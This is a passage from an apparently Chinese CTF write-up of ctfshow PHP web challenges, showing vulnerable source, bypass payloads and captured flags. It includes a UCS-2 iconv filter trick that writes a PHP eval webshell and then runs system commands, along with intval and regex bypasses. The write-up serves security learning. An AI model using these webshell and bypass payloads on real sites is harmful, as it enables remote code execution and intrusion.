<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'too young too simple sometimes naive!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'contents'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"&lt;?php die();?&gt;"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>这里过滤了 string、base64 和 rot13 让 filter 的抹除 die 方法用不了，过滤的 log、sess 让包含日志文件也无法使用……</p><p>这里需要更多的编码方式了：<strong>ucs-2 编码</strong></p><p>convert.iconv 过滤器：</p><blockquote><p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用 convert.iconv.* 过滤器等同于用 iconv () 函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换；</p><p>其用法：iconv (string $in_charset , string $out_charset , string $str)</p><p>string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于 base_convert 的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已（可以类比）</p><p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换。</p></blockquote><p>usc-2：通过 usc-2 的编码进行转换，对目标字符串进行 2 位一反转。如此，所以字符的数目需要保持为偶数。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">iconv</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"UCS-2LE"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"UCS-2BE"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'&lt;?php @eval($_POST[ok]);?&gt;'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>输出为：?&lt;hp pe@av (l_$OPTSo [] k;)&gt;?</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">// ucs大小写没有要求，大小写都可以</span></span>
<span class="line"><span style="color:#6a9955">// 记得参数要是两位，比如：ok    </span></span>
<span class="line"><span style="color:#d4d4d4">get：?file=php:</span><span style="color:#6a9955">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=v.php</span></span>
<span class="line"><span style="color:#d4d4d4">post：contents=?&lt;hp pe@</span><span style="color:#dcdcaa">av</span><span style="color:#d4d4d4">(l_</span><span style="color:#9cdcfe">$OPTSo</span><span style="color:#d4d4d4">[]k;)&gt;?</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">// 访问v.php后</span></span>
<span class="line"><span style="color:#d4d4d4">post: ok=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac f*'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">// 这下面不懂</span></span>
<span class="line"><span style="color:#6a9955">// 原理和rot13一样，两次转换后变成了原来的样子</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">iconv</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"UCS-2LE"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"UCS-2BE"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'&lt;?php die();?&gt;?&lt;hp pvela$(P_SO[T]1;)&gt;?'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#6a9955">// 输出如下，使得die失效，并且我们的一句话木马可以使用</span></span>
<span class="line"><span style="color:#d4d4d4">?&lt;hp </span><span style="color:#dcdcaa">pid</span><span style="color:#d4d4d4">(e;)&gt;?&lt;?php </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{09148130-9a5b-469c-8be8-9511ce8be9ca}</span></span></code></pre></div></div></figure><h2 id="php特性"><a class="markdownIt-Anchor" href="#php特性"></a> php 特性</h2><h3 id="web89intval数组绕过"><a class="markdownIt-Anchor" href="#web89intval数组绕过"></a> web89	(intval 数组绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/[0-9]/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里是要传参 num 但是不能为数字，取整要有返回值。查 intval 方法可以知道，空的 array 返回 0，非空的 array 返回 1</p><p>payload：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num[]</span></span></code></pre></div></div></figure><blockquote><p>echo intval(array()); // 0</p><p>echo intval(array('foo', 'bar')); // 1</p></blockquote><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">dbb40d2-</span><span style="color:#b5cea8">047</span><span style="color:#d4d4d4">c-</span><span style="color:#b5cea8">4225</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">98</span><span style="color:#d4d4d4">b3-</span><span style="color:#b5cea8">1790</span><span style="color:#d4d4d4">aa2b9257}</span></span></code></pre></div></div></figure><h3 id="web90intval进制转换绕过"><a class="markdownIt-Anchor" href="#web90intval进制转换绕过"></a> web90	(intval 进制转换绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">"4476"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)===</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 "0" 开始，使用 8 进制 (octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul></blockquote><p>可以用进制转换绕过一下 if：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">十进制数为：4476</span></span>
<span class="line"><span style="color:#dcdcaa">转换为二进制为：0b1000101111100</span></span>
<span class="line"><span style="color:#dcdcaa">转换为八进制为：0o10574</span></span>
<span class="line"><span style="color:#dcdcaa">转换为十六进制为：0x117c</span></span></code></pre></div></div></figure><p>用 8 进制或者 16 进制都可以</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">198</span><span style="color:#d4d4d4">f07e3-</span><span style="color:#b5cea8">96</span><span style="color:#d4d4d4">ad-</span><span style="color:#b5cea8">495</span><span style="color:#d4d4d4">a-</span><span style="color:#b5cea8">94</span><span style="color:#d4d4d4">bc-</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">f395c103518}</span></span></code></pre></div></div></figure><h3 id="web91不同模式匹配理解"><a class="markdownIt-Anchor" href="#web91不同模式匹配理解"></a> web91	(不同模式匹配理解)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#dcdcaa">show_source</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'cmd'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d16969">php</span><span style="color:#d4d4d4">$</span><span style="color:#d16969">/im'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d16969">php</span><span style="color:#d4d4d4">$</span><span style="color:#d16969">/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'hacker'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'nonononono'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: cmd in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">15</span></span>
<span class="line"><span style="color:#d4d4d4">nonononono</span></span></code></pre></div></div></figure><blockquote><p>^ 匹配输入字符串的开始位置。在字符域 [] 中表示取反，如<sup> \w 等于 '\w'; 而</sup> \w 表示以单词字符开头。</p><p>$ 匹配输入字符串的结束位置。例 '\w$' 表示以单词字符结尾。</p><p>定界符最后会有一个字母，通常是 /i，这个 i 是模式修正符。</p><p>i 表示在和模式进行匹配进不区分大小写</p><p>其中 m 将模式视为多行，使用 ^ 和 $ 表示任何一行都可以以正则表达式开始或结束。</p></blockquote><p>这里第一条正则，匹配开始为 php 结尾为 php，也就是说只能是 php；这两句匹配只有匹配模式的不同</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151036.png" srcset="/img/loading/loading.gif" lazyload alt="runoob-regex"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152239.png" srcset="/img/loading/loading.gif" lazyload alt="i"></p><p>于是构造 payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?cmd=%</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">aphp</span></span></code></pre></div></div></figure><p>由于多行模式可以匹配多行中是否存在满足情况的字符串，于是 url 一个 %0a 进行换行，这样依然能多行匹配到 php，使得第一个 if 成立，而第二个 if 为单行匹配只能匹配到换行字符不能匹配到 php 于是成功绕过。</p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">63755</span><span style="color:#d4d4d4">b98-</span><span style="color:#b5cea8">08</span><span style="color:#d4d4d4">b7-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">af2-</span><span style="color:#b5cea8">9382</span><span style="color:#d4d4d4">-b17a91cdcad3}</span></span></code></pre></div></div></figure><h3 id="web92intval小数点截断绕过"><a class="markdownIt-Anchor" href="#web92intval小数点截断绕过"></a> web92	(intval 小数点截断绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)==</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这个由强比较变成了弱比较，可以小数点截断绕过：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">4476.3</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">85983</span><span style="color:#d4d4d4">d0c-a2e6-</span><span style="color:#b5cea8">4515</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">8246</span><span style="color:#d4d4d4">-f1e54822ab25}</span></span></code></pre></div></div></figure><h3 id="web93intval小数点截断"><a class="markdownIt-Anchor" href="#web93intval小数点截断"></a> web93	(intval 小数点截断)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/[a-z]/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)==</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
